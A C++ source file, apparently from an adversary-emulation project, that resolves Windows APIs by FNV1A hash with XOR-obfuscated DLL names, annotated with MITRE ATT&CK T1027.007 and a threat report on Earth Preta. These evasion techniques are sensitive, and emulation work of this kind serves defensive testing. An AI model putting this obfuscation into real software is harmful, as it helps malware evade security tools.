#include "handler_util.hpp"

/*
 * ResolveSharedApis:
 *      About:
 *          Dynamically resolve Windows APIs using the FNV1A hash.
 *      Result:
 *          Returns 0 on success, otherwise some error code
 *      MITRE ATT&CK Techniques:
 *          T1027.007: Obfuscated Files or Information: Dynamic API Resolution
 *      CTI:
 *          https://www.trendmicro.com/en_us/research/22/k/earth-preta-spear-phishing-governments-worldwide.html
 */
DWORD ResolveSharedApis(shared_func_pointers* fp) {
    static HMODULE h_bcrypt = LoadLibraryW(XorStringW(L"bcrypt.dll"));
    if (!h_bcrypt) {
        return FAIL_LOAD_BCRYPT;
    }

    fp->fp_GetLastError = RESOLVE_FN_FNV1A(XorStringW(L"Kernel32.dll"), GetLastError);
    if (!fp->fp_GetLastError) {
        return FAIL_GET_GETLASTERROR;
    }

    fp->fp_CreateFileW = RESOLVE_FN_FNV1A(XorStringW(L"Kernel32.dll"), CreateFileW);
    if (!fp->fp_CreateFileW) {
        return FAIL_GET_CREATEFILEW;
    }

    fp->fp_CloseHandle = RESOLVE_FN_FNV1A(XorStringW(L"Kernel32.dll"), CloseHandle);
    if (!fp->fp_CloseHandle) {
        return FAIL_GET_CLOSEHANDLE;
    }

    fp->fp_vsnprintf = RESOLVE_FN_FNV1A(XorStringW(L"ntdll.dll"), _vsnprintf);
    if (!fp->fp_vsnprintf) {
        return FAIL_GET_VSNPRINTF;
    }

    fp->fp_snprintf = RESOLVE_FN_FNV1A(XorStringW(L"ntdll.dll"), _snprintf);
    if (!fp->fp_snprintf) {
        return FAIL_GET_SNPRINTF;
    }

    fp->fp_GetSystemTime = RESOLVE_FN_FNV1A(XorStringW(L"Kernel32.dll"), GetSystemTime);
    if (!fp->fp_GetSystemTime) {
        return FAIL_GET_GETSYSTEMTIME;
    }

    fp->fp_SetFilePointer = RESOLVE_FN_FNV1A(XorStringW(L"Kernel32.dll"), SetFilePointer);
    if (!fp->fp_SetFilePointer) {
        return FAIL_GET_SETFILEPOINTER;
    }

    fp->fp_HeapAlloc = reinterpret_cast<HeapAlloc_t>(RESOLVE_FN_PTR_FNV1A(L"ntdll.dll", RtlAllocateHeap));
    if (!fp->fp_HeapAlloc) {
        return FAIL_GET_HEAPALLOC;
    }

    fp->fp_HeapCreate = RESOLVE_FN_FNV1A(XorStringW(L"Kernel32.dll"), HeapCreate);
    if (!fp->fp_HeapCreate) {
        return FAIL_GET_HEAPCREATE;
    }

    fp->fp_HeapDestroy = RESOLVE_FN_FNV1A(XorStringW(L"Kernel32.dll"), HeapDestroy);
    if (!fp->fp_HeapDestroy) {
        return FAIL_GET_HEAPDESTROY;
    }

    fp->fp_HeapFree = RESOLVE_FN_FNV1A(XorStringW(L"Kernel32.dll"), HeapFree);
    if (!fp->fp_HeapFree) {
        return FAIL_GET_HEAPFREE;
    }

    fp->fp_WriteFile = RESOLVE_FN_FNV1A(XorStringW(L"Kernel32.dll"), WriteFile);
    if (!fp->fp_WriteFile) {
        return FAIL_GET_WRITEFILE;
    }

    fp->fp_BCryptGenRandom = RESOLVE_FN_FNV1A_BY_HMODULE(h_bcrypt, BCryptGenRandom);
    if (!fp->fp_BCryptGenRandom) {
        return FAIL_GET_BCRYPTGENRANDOM;
    }

    return ERROR_SUCCESS;
}

// Returns true if path ends in leaf, false otherwise
BOOL FilePathHasLeaf(LPCWSTR path, LPCWSTR leaf) {
    int last_slash_index = -1;
    size_t i = 0;
    wchar_t curr;
    do {
        curr = path[i];
        if (curr == L'\\') {
            last_slash_index = i;
        }
        i++;
    } while(curr != L'\0');
    int comp_start = last_slash_index + 1; // will be 0 if no slash
    return _wcsicmp(path + comp_start, leaf) == 0;
}
